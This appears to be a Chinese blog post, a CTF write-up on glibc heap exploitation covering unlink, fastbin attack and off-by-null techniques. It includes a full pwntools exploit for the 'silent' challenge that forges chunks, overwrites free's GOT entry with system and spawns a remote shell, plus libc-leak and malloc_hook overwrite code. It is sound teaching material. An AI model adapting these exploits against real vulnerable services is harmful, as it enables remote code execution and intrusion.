@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="总结一下自己遇到过的ctf heap 类的利用方法，把脚本和思路收集一下。  Unlink技术 第一次接触是在强网杯2018，题目：silent unlink从最初的没有检查机制，到现在的检查前后chunk，使得unlink的利用变得更加复杂，具体内容参见ctfwiki。检查内容如下： 123&#x2F;&#x2F; fd bkif (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【堆利用】heap利用技术">
+<meta property="og:url" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Amjac 的博客">
+<meta property="og:description" content="总结一下自己遇到过的ctf heap 类的利用方法，把脚本和思路收集一下。  Unlink技术 第一次接触是在强网杯2018，题目：silent unlink从最初的没有检查机制，到现在的检查前后chunk，使得unlink的利用变得更加复杂，具体内容参见ctfwiki。检查内容如下： 123&#x2F;&#x2F; fd bkif (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&amp;g">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/silent1.jpg">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870112187.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870254884.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870275171.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870477057.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870621856.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870733457.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/image-20201007115842957.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/image-20201007120448714.png">
+<meta property="og:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/image-20201007120836065.png">
+<meta property="article:published_time" content="2019-07-23T07:36:11.000Z">
+<meta property="article:modified_time" content="2021-06-27T02:32:03.889Z">
+<meta property="article:author" content="Amjac">
+<meta property="article:tag" content="CTF学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/silent1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【堆利用】heap利用技术</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">主页</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2019/07/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2018/12/hxpctf2018-pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&text=【堆利用】heap利用技术"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&is_video=false&description=【堆利用】heap利用技术"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【堆利用】heap利用技术&body=Check out this article: https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&name=【堆利用】heap利用技术&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&t=【堆利用】heap利用技术"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unlink%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text"> Unlink技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目分析&#x2F;利用步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">2.</span> <span class="toc-text"> Fastbin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text"> 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 利用步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#off-by-null"><span class="toc-number">3.</span> <span class="toc-text"> off by null</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text"> 利用分析</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【堆利用】heap利用技术
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Amjac</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-23T07:36:11.000Z" itemprop="datePublished">2019-07-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF%E5%AD%A6%E4%B9%A0/" rel="tag">CTF学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>总结一下自己遇到过的ctf heap 类的利用方法，把脚本和思路收集一下。</p>
+<h1 id="unlink技术"><a class="markdownIt-Anchor" href="#unlink技术"></a> Unlink技术</h1>
+<p>第一次接触是在强网杯2018，题目：silent</p>
+<p>unlink从最初的没有检查机制，到现在的检查前后chunk，使得unlink的利用变得更加复杂，具体内容参见<a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/unlink/">ctfwiki</a>。检查内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>
+<p>如下图所示，要绕过检查，必须有一个已知指针P保存了被unlink的chunk，</p>
+<p>举个比方。想要在free(chunk2)时unlink chunk1，必须有一个已知指针P保存了chunk1的地址，并把chunk1的fd指针和bk指针都指向与P有关的位置。原理如下图：</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/silent1.jpg" alt></p>
+<p>最后，P中存储的值会被更改为 <strong>P-0x18</strong>。回到题目上来。</p>
+<p><a href="download/silent-unlink">题目链接</a></p>
+<p>程序功能：</p>
+<ol>
+<li>malloc一个块，可以指定size大小，读入字符串</li>
+<li>free一个块，指针没有清空</li>
+<li>更新一个块的信息，覆盖之前的数据，覆盖的长度取决于strlen</li>
+</ol>
+<h2 id="题目分析利用步骤"><a class="markdownIt-Anchor" href="#题目分析利用步骤"></a> 题目分析/利用步骤</h2>
+<p>用unlink的思路来解决这道题。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#2</span></span><br></pre></td></tr></table></figure>
+<p>先申请3个块，占据bss段中s的前三个8B，构造 s - 0x18 + 3*0x8 = s</p>
+<p><em>在这里我们将P指向 s+3*0x8  (0x6020C0 + 3*0x8)，是为了避免P指向 s时，对其进行修改操作时 strlen()返回值为 0，即无法修改。</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#2</span></span><br></pre></td></tr></table></figure>
+<p>先申请3个块，占据bss段中s的前三个8B，构造 s - 0x18 + 3*0x8 = s</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xff</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xff</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#5</span></span><br></pre></td></tr></table></figure>
+<p>申请块3，4（释放后属于unsorted bin，可以合并），申请5的目的是防止3和4合并后一路合并到topchunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss = <span class="number">0x6020c0</span> + <span class="number">0x18</span></span><br><span class="line">fd = bss-<span class="number">0x18</span></span><br><span class="line">bk = bss-<span class="number">0x10</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x210</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x101</span>)+p64(fd)+p64(bk)+<span class="string">&quot;b&quot;</span>*(<span class="number">0x100</span>-<span class="number">0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x90</span>)+<span class="string">&quot;c&quot;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&quot;d&quot;</span>*(<span class="number">0x210</span>-<span class="number">0x1c0</span>-<span class="number">1</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure>
+<p><strong>这一段非常重要，涉及到伪造chunk</strong></p>
+<p>free掉3，4块之后，会被合并为一个大chunk，其大小为（包括chunkhead）：0x100+0x10+0x100+0x10 = 0x220。所以我们申请0x210大小的chunk时，会申请到之前3，4合并的地址。</p>
+<p>我们在这个0x220大小的chunk中，伪造两个chunk，分隔恰好制造为 s[4]指针指向的地方。再布置好s[3]chunk里的fd，bk，就可以进行一次unlink。</p>
+<p>解释一长串的字符串：</p>
+<p>p64(0x0) + p64(0x101) + p64(fd) + p64(bk) ：构造第一个假chunk，其大小为之前的大小（0x100+0x10）减去0x10字节（损失了一个chunk head）。构造0x101表示前一堆块正在使用，不合并。</p>
+<p><code>&quot;b&quot; * (0x100 - 0x20)</code>：充填。</p>
+<p><code>p64(0x100) + p64(0x90) + &quot;c&quot;*0x80</code>：构造prev_size和size位，添加充填。</p>
+<p><code>p64(0) + p64(0x21) + &quot;a&quot;*0x10</code> ：构造第三个chunk</p>
+<p><code>p64(0) + p64(0x21) + &quot;d&quot;*(0x210-0x1c0-1)</code> ：构造第四个chunk</p>
+<p>为啥要构造第四个chunk？</p>
+<p>为了检查第三个chunk是否在使用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">update(<span class="number">3</span>, <span class="string">&quot;\x18\x20\x60\x00&quot;</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x2f</span>)                                 </span><br><span class="line">update(<span class="number">0</span>, <span class="string">&quot;\x30\x07\x40\x00\x00\x00&quot;</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x2d</span>)</span><br></pre></td></tr></table></figure>
+<p>释放掉chunk4，unlink完成，s[3]的指针被修改为&amp;s</p>
+<p>0x602018是free函数的got表地址。</p>
+<p>update(3) 将s[0]的指针修改为free函数的got表地址</p>
+<p>update(0) 将free函数的got表值修改为system函数值</p>
+<p>这样之后释放 chunk2时，调用free(s[2])就等于调用system(s[2])，</p>
+<p>而 s[2] 中存字符串 “/bin/sh\x00”，所以调用delete(2)会弹shell。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&quot;./silent&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;39.107.32.132&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x400b0f   &quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, s</span>):</span></span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">key, data1, data2</span>):</span></span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(key))</span><br><span class="line">	p.send(data1)</span><br><span class="line">	p.send(data2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">key</span>):</span></span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(key))</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x6020C0</span>+<span class="number">0x18</span></span><br><span class="line">f=bss-<span class="number">0x18</span></span><br><span class="line">b=bss-<span class="number">0x10</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;;;:.&#x27;)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xff</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xff</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span>-<span class="number">8</span>))<span class="comment">#5</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x210</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x101</span>)+p64(f)+p64(b)+<span class="string">&quot;b&quot;</span>*(<span class="number">0x100</span>-<span class="number">0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x90</span>)+<span class="string">&quot;c&quot;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&quot;d&quot;</span>*(<span class="number">0x210</span>-<span class="number">0x1c0</span>-<span class="number">1</span>))<span class="comment">#6</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">update(<span class="number">3</span>, <span class="string">&quot;\x18\x20\x60\x00&quot;</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x2f</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&quot;\x30\x07\x40\x00\x00\x00&quot;</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x2d</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="comment">#p.sendline(&quot;5&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="fastbin-attack"><a class="markdownIt-Anchor" href="#fastbin-attack"></a> Fastbin Attack</h1>
+<p>一个简单粗暴的技术，可以让fastbin分配到（伪）任意位置，从而实现（伪）任意地址写。然而2.27版本的tcache毒化比这个更加无脑，显得fastbin有些鸡肋了，但并不影响fastbin attack的重要地位。</p>
+<p>这里随便找了个题演示。<a href="download/silent-unlink">题目链接</a></p>
+<h2 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h2>
+<p>利用unsortedbin泄漏libc地址，<strong>将fake chunk布置在libc的malloc_hook之前</strong></p>
+<p>unsorted bin只有一个块时，其前后项指针都会指向位于libc中的main_arena中。我们增加一个advertisement之后再释放，将其置入unsortedbin，然后增加一个poster，此时会从unsortedbin中切出poster大小的chunk。由于系统并未清除chunk中的信息，我们读出后可以得到libc的地址信息。</p>
+<p>利用fastbin的double free，我们在libc的malloc_hook之前的位置构造一个伪chunk，欺骗系统将其分配给我们，从而可以修改malloc_hook，改为one_gadget的地址。在调用malloc之前执行，从而控制程序流，getshell。</p>
+<h3 id="利用步骤"><a class="markdownIt-Anchor" href="#利用步骤"></a> 利用步骤</h3>
+<ol>
+<li>
+<p>确定main_arena的偏移，获得libc地址：</p>
+<p>unsortedbin只有一个块时，其前后指针都会指向main_arena，位于libc中。我们先确定main_arena在libc中的偏移。</p>
+<p><strong>寻找malloc_trim函数，ida中反汇编如下：</strong></p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870112187.png" alt="1563870112187"></p>
+<p>即偏移地址是0x3c4b20</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">#申请一个ad，放入unsortedbin中</span></span><br><span class="line">ad(<span class="string">&#x27;abcdefgh&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">   post(<span class="string">&#x27;abcdefgh&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#读出libc地址</span></span><br><span class="line">   main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">post(<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">   show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">   arena_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>但是在实际调试的过程中发现算出的地址和实际的地址相差0x100个字节</p>
+<p>经过调试，在申请unsortedbin的chunk之前，该chunk保存的前后指针如下，是main_arena+88</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870254884.png" alt></p>
+<p>但是申请之后，得到的chunk内部数据是：<img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870275171.png" alt="1563870275171"></p>
+<p>增加了0x100。可能是因为这里对unsortedbin进行了切割，因此修改了内部的数据。</p>
+<p>所以在泄漏地址时额外减去0x100即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = arena_addr - main_arena - <span class="number">88</span> - <span class="number">0x100</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>确定fake chunk应该布置的位置</p>
+<p>找到malloc_hook的位置，前面有libc的地址，高位字节是0x7f，可以利用fastbinattack来申请到该位置的内存。</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870477057.png" alt="1563870477057"></p>
+<p>在malloc_hook-0x3-0x10的位置作为fastbin的chunkhead</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870621856.png" alt="1563870621856"></p>
